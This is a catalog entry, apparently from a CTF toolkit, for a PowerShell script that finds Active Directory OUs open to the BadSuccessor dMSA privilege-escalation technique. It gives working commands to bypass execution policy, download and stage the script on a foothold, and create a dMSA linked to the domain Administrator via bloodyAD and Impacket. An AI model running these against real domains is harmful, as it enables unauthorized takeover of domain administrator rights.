# CTFTTOU-449 — Get-BadSuccessorOUPermissions.ps1

> **Tool ID:** `CTFTTOU-449`  
> **Related techniques/counters:** CTFTTE-FPN-021, CTFTCTE-FPN-021

## Description

PowerShell discovery script for the delegated Managed Service Account (dMSA) abuse
known as BadSuccessor. It walks the domain's organizational units, decodes each OU's
`nTSecurityDescriptor`, and reports which identities hold the rights needed to create a
dMSA child object below that OU — the precondition for linking a successor to a
privileged predecessor. Built-in privileged groups (Domain Admins, Enterprise Admins,
…) are filtered out of the output.

Three limits matter when reading the result:

- it needs **only domain read** rights, so a low-privileged foothold can run it;
- it does **not** expand group nesting, so a principal that inherits the right through a
  group appears only under that group's own entry — cross-check with the effective
  memberships (`ad_inventory.py`) or BloodHound's `GenericAll`/`CreateChild` edge on the OU;
- it reports the ACL, not exploitability: the domain must also expose the dMSA schema
  (`msDS-DelegatedMSAState`), i.e. Windows Server 2025 or later.

The script is discovery only; creating the dMSA and completing the migration is the
gated mutation step, performed with `bloodyAD add badSuccessor`, `badsuccessor.py`
(Impacket), `SharpSuccessor.exe` or `BadSuccessor.ps1` — see
[CTFTCTE-FPN-021](../countertechniques/CTFTCTE-FPN-021.md).

## URL

<https://github.com/akamai/BadSuccessor>

## Installation

Staged as a file on a Windows foothold; nothing to install on Linux (the NetExec module
and Impacket's `badsuccessor.py` cover the Linux side). Requires no elevation.

```powershell
# on the Windows foothold (PowerShell)
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
Invoke-WebRequest `
  -Uri https://raw.githubusercontent.com/akamai/BadSuccessor/main/Get-BadSuccessorOUPermissions.ps1 `
  -OutFile .\Get-BadSuccessorOUPermissions.ps1
```

From a Kali WSL shell the same file can be dropped through `powershell.exe` interop
(`powershell.exe -File .\Get-BadSuccessorOUPermissions.ps1`) or uploaded with
`nxc smb <host> -u user -p pass --put-file Get-BadSuccessorOUPermissions.ps1 C:\Windows\Temp\Get-BadSuccessorOUPermissions.ps1`.

## Usage

```powershell
# list identities -> OUs where a dMSA can be created
.\Get-BadSuccessorOUPermissions.ps1

# same question, read-only, from the ACL of one known OU
(Get-ACL -Path "AD:\OU=LabOU,DC=corp,DC=local").Access |
  Select-Object ActiveDirectoryRights, IdentityReference
```

Reading the output: an entry for your own principal (or a group it belongs to) means the
next hop — create a dMSA in that OU, point `msDS-ManagedAccountPrecededByLink` at the
target, set `msDS-DelegatedMSAState` to *Completed*, request the dMSA's TGT and use it.
Linux equivalents, verified against Impacket 0.14:

```bash
# search (same logic as the PowerShell script, LDAP from Linux)
nxc ldap DC01.corp.local -u user -p 'Passw0rd!' -d corp.local --dns-server DC01.corp.local -M badsuccessor
python3 /usr/share/doc/python3-impacket/examples/badsuccessor.py corp.local/user:'Passw0rd!' -dc-ip DC -action search

# create / delete the linked dMSA (mutation — record the prior state)
bloodyAD -d corp.local -u user -p 'Passw0rd!' --host DC01.corp.local add badSuccessor successor_dmsa
python3 /usr/share/doc/python3-impacket/examples/badsuccessor.py corp.local/user:'Passw0rd!' \
  -dc-ip DC -action add -target-ou "OU=LabOU,DC=corp,DC=local" \
  -dmsa-name successor -target-account "CN=Administrator,CN=Users,DC=corp,DC=local"
```

## Skills

- [ctf-ad-attack-paths](../skills/CTFTSKL-004.md) — decision layer; the dMSA workflow lives in `references/delegation-and-coercion.md`

## Related Techniques

CTFTTE-FPN-021, CTFTCTE-FPN-021

## References

- [BadSuccessor repository](https://github.com/akamai/BadSuccessor)
- [Akamai research — abusing dMSA for privilege escalation](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [Impacket badsuccessor.py](https://github.com/fortra/impacket/blob/master/examples/badsuccessor.py)
- [bloodyAD `add badSuccessor`](https://github.com/CravateRouge/bloodyAD)
